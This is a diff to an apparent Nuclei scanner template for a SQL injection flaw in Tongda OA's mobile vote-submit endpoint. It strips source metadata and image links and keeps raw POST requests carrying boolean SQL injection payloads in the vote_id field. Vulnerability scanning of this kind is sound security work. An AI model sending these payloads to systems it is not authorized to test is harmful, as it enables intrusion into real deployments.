@@ -3,12 +3,8 @@ info:
   name: 通达OA qyapp.vote.submit.php存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cgqagdf4zatgpuag'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cgqagdf4zatgpuag
-    fofa: app="TDXK-通达OA"
 http:
 - raw:
   - 'POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
@@ -39,7 +35,7 @@ http:
     submitData={"a":{"vote_type":"1","vote_id":"if((select 995=995),1,2*1e308)","value":"1"}}
 
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600157625-5cf05ba7-9dbc-44ad-adae-fb292dd42e3b.png)POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
+    POST /mobile/api/qyapp.vote.submit.php HTTP/1.1
 
     Host: {{Hostname}}
 
@@ -64,11 +60,7 @@ http:
     Content-Length: 93
 
 
-    submitData={"a":{"vote_type":"1","vote_id":"if((select 995=99511),1,2*1e308)","value":"1"}}
-
-
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1732600157889-fcb050b4-6c09-48b3-8912-1752c7dbf7dc.png)'
+    submitData={"a":{"vote_type":"1","vote_id":"if((select 995=99511),1,2*1e308)","value":"1"}}'
   redirects: false
   matchers:
   - status:
